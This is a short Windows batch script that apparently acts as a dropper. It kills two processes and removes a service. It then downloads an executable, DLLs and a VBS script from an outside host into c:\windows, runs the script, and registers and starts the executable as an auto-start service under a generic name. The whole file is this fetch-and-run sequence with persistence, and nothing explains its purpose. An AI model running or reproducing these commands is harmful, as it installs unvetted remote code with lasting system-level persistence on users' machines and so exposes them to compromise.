taskkill /f /im sys1.exe
taskkill /f /im sys2.exe
sc delete CppWindowsService
wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
cscript c:\windows\svc.vbs
net start CppWindowsService
 